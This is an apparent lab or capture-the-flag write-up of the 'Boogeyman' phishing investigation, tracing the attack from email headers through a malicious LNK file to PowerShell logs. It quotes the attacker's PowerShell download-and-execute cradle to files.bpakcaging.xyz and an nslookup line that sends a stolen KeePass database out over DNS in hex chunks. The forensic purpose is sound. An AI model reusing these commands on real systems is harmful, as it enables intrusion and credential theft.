## Boogeyman Investigation — Complete Short Note

### Scenario

Julianne, a finance employee at **Quick Logistics LLC**, received a phishing email pretending to be about an unpaid invoice from **B Packaging Inc**. The attachment was malicious and compromised her workstation. The activity was linked to a threat group called **Boogeyman**, targeting the logistics sector.

---

## Part 1: Phishing Email + Attachment Analysis

### 1. Sender email

Answer:

```text
agriffin@bpakcaging.xyz
```

How to find:

```bash
cat dump.eml | grep -Ei "From:"
```

Why important:

```text
Shows the attacker-controlled sender address used in the phishing email.
```

---

### 2. Victim email

Answer:

```text
julianne.westcott@hotmail.com
```

How to find:

```bash
cat dump.eml | grep -Ei "To:"
```

Why important:

```text
Shows who received the phishing email.
```

---

### 3. Mail relay service

Answer:

```text
elasticemail
```

How to find:

```bash
cat dump.eml | grep -Ei "DKIM-Signature|List-Unsubscribe"
```

Why important:

```text
Attackers used a third-party mail relay to send phishing emails and appear more legitimate.
```

---

### 4. File inside encrypted attachment

Answer:

```text
Invoice_20230103.lnk
```

How to find:

```text
Open dump.eml in Thunderbird → save attachment → extract ZIP using password
```

or manually rebuild attachment:

```bash
cat PAYLOAD_FILE | base64 -d > Invoice.zip
```

Why important:

```text
.lnk files can execute commands when clicked.
```

---

### 5. Attachment password

Answer:

```text
Invoice2023!
```

Why attacker used password protection:

```text
Encrypted ZIP files can bypass some email scanners because security tools may not inspect the contents.
```

---

### 6. Encoded payload in LNK file

Use:

```bash
lnkparse Invoice_20230103.lnk
```

Answer:

```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

Decode it:

```bash
echo 'aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Decoded payload:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

Meaning:

```text
The LNK file runs PowerShell, downloads code from files.bpakcaging.xyz/update, and executes it using iex.
```

---

## Part 2: PowerShell Log Analysis

Main command used to read PowerShell logs:

```bash
cat powershell.json | jq -r -s 'sort_by(.Timestamp)[] | .ScriptBlockText'
```

This sorts logs by time and shows the PowerShell commands executed by the attacker.

---

### 1. Attacker domains

Command:

```bash
cat powershell.json | jq -r '.ScriptBlockText' | grep -Eo "[A-Za-z0-9.-]+\.xyz" | sort -u
```

Answer:

```text
cdn.bpakcaging.xyz,files.bpakcaging.xyz
```

Why important:

```text
files.bpakcaging.xyz = file hosting
cdn.bpakcaging.xyz = C2 communication
```

---

### 2. Enumeration tool downloaded

Command:

```bash
cat powershell.json | jq -r '.ScriptBlockText' | grep -Ei "iwr|outfile|exe"
```

Answer:

```text
seatbelt
```

Why attacker used it:

```text
Seatbelt is used to enumerate system information, users, security settings, and possible privilege escalation paths.
```

---

### 3. File accessed with sq3.exe

Command:

```bash
cat powershell.json | jq -r -s 'sort_by(.Timestamp)[] | .ScriptBlockText' | grep -Ei "sq3.exe|cd"
```

Answer:

```text
C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
```

Why attacker used it:

```text
sq3.exe was likely sqlite3.exe. The attacker used it to read the Sticky Notes database.
```

---

### 4. Software using that file

Answer:

```text
Microsoft Sticky Notes
```

How to know:

```text
The path contains Microsoft.MicrosoftStickyNotes.
```

Why important:

```text
Sticky Notes may contain passwords, reminders, or sensitive information.
```

---

### 5. Exfiltrated file

Command:

```bash
cat powershell.json | jq -r -s 'sort_by(.Timestamp)[] | .ScriptBlockText' | grep -Ei "kdbx|ReadAllBytes|nslookup|destination"
```

Answer:

```text
protected_data.kdbx
```

Why important:

```text
.kdbx is a KeePass password database and may contain credentials.
```

---

### 6. File type

Answer:

```text
keepass
```

Meaning:

```text
.kdbx files are KeePass password database files.
```

---

### 7. Encoding used for exfiltration

Answer:

```text
hex
```

How to know:

```powershell
$split = $hex -split '(\S{50})'
```

Why attacker used it:

```text
The attacker converted binary data into text-safe hex chunks so it could be sent through DNS queries.
```

---

### 8. Exfiltration tool

Answer:

```text
nslookup
```

How to know:

```powershell
nslookup -q=A "$line.bpakcaging.xyz" $destination
```

Why attacker used it:

```text
nslookup sends DNS queries. The attacker placed stolen hex chunks inside DNS subdomains to exfiltrate data.
```

---

## Final Attack Flow

```text
Phishing email received
→ encrypted ZIP attachment opened
→ Invoice_20230103.lnk executed
→ PowerShell downloaded code from files.bpakcaging.xyz/update
→ attacker established C2 with cdn.bpakcaging.xyz
→ downloaded tools like Seatbelt and sq3.exe
→ enumerated the system
→ read Microsoft Sticky Notes database
→ found protected_data.kdbx
→ read file bytes with PowerShell
→ encoded data as hex
→ split data into chunks
→ exfiltrated chunks using nslookup over DNS
```

Main lesson:

```text
As an incident responder, follow the chain from email headers → attachment → LNK payload → PowerShell logs → downloaded tools → accessed files → exfiltration method.
```
---
